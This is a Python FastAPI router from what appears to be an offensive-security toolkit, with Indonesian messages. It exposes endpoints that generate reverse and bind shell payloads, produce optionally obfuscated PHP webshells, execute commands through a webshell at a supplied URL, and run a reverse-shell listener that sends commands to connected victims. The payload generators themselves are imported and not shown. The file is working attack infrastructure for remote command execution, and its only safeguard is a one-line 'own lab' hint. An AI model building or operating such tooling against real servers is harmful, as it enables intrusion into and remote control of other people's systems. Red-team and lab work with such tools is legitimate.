"""Shells API: payloads, webshell client, reverse-shell listener."""
from __future__ import annotations

import asyncio

from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

from ..core.job_manager import jobs, launch_async_job
from ..modules.shells import payloads, webshell_client
from ..modules.shells.reverse_listener import ReverseListener

router = APIRouter(prefix="/api/shells", tags=["shells"])

_listeners: dict[int, ReverseListener] = {}


# --- Payload generator --------------------------------------------------------
class PayloadBody(BaseModel):
    lhost: str
    lport: int = 4444


@router.post("/payloads")
def get_payloads(body: PayloadBody):
    return {"reverse": payloads.reverse_shells(body.lhost, body.lport),
            "bind": payloads.bind_shells(body.lport)}


class WebshellBody(BaseModel):
    kind: str = "php"
    secret: str = ""
    obfuscate: bool = False


@router.post("/webshell")
def webshell(body: WebshellBody):
    code = payloads.webshell(body.kind, body.secret)
    if body.obfuscate:
        code = payloads.obfuscate_php(code)
    return {"kind": body.kind, "code": code,
            "hint": "Upload hanya ke lab milikmu sendiri."}


# --- Webshell client ----------------------------------------------------------
class ExecBody(BaseModel):
    url: str
    param: str = "cmd"
    secret: str = ""
    secret_param: str = "k"
    os_hint: str = "auto"
    cookies: dict = {}
    headers: dict = {}


@router.post("/webshell/exec")
async def webshell_exec(body: ExecBody):
    job = launch_async_job(
        jobs, "shells", f"webshell exec {body.url}", f"webshell-exec {body.url}",
        lambda append: _exec_and_log(body, append),
    )
    return {"job": job.to_dict()}


async def _exec_and_log(body: ExecBody, append):
    res = await webshell_client.exec_command(
        body.url, param=body.param, secret=body.secret,
        secret_param=body.secret_param, os_hint=body.os_hint,
        cookies=body.cookies or None, headers=body.headers or None)
    if res.get("ok"):
        append(f"[*] status {res['status']}, len={res['length']}, "
               f"exec detected={res['detected_exec']}")
        for ln in (res.get("output") or "").splitlines()[:100]:
            append(ln)
    else:
        append(f"[!] {res.get('error')}")
    return res


class ProbeBody(BaseModel):
    url: str
    secret: str = ""
    secret_param: str = "k"
    cookies: dict = {}
    headers: dict = {}


@router.post("/webshell/probe")
async def webshell_probe(body: ProbeBody):
    job = launch_async_job(
        jobs, "shells", f"webshell probe {body.url}", f"webshell-probe {body.url}",
        lambda append: webshell_client.probe_shell(
            body.url, secret=body.secret, secret_param=body.secret_param,
            cookies=body.cookies or None, headers=body.headers or None,
            log=append),
    )
    return {"job": job.to_dict()}


# --- Reverse shell listener ---------------------------------------------------
class ListenerBody(BaseModel):
    port: int = 4444
    host: str = "0.0.0.0"


@router.post("/listener/start")
async def listener_start(body: ListenerBody):
    if body.port in _listeners:
        raise HTTPException(409, f"listener di port {body.port} sudah jalan")
    logs: list[str] = []

    def log(msg: str) -> None:
        logs.append(str(msg))

    listener = ReverseListener(body.host, body.port, log=log)
    asyncio.create_task(listener.start())
    _listeners[body.port] = listener
    return {"started": True, "port": body.port, "host": body.host,
            "note": "Gunakan /send untuk mengirim command ke koneksi masuk."}


@router.post("/listener/{port}/send")
async def listener_send(port: int, body: dict):
    listener = _listeners.get(port)
    if not listener:
        raise HTTPException(404, f"tidak ada listener di port {port}")
    cmd = str(body.get("command", "")).strip()
    if not cmd:
        raise HTTPException(400, "command kosong")
    sent = await listener.send_command(cmd)
    return {"sent": sent, "connections": list(listener.connections.keys()),
            "active": listener.active_id}


@router.post("/listener/{port}/stop")
async def listener_stop(port: int):
    listener = _listeners.pop(port, None)
    if not listener:
        raise HTTPException(404, f"tidak ada listener di port {port}")
    await listener.stop()
    return {"stopped": True}


@router.get("/listener")
def listener_list():
    return {"listeners": [
        {"port": p, "host": l.host,
         "connections": list(l.connections.keys()), "active": l.active_id}
        for p, l in _listeners.items()
    ]}
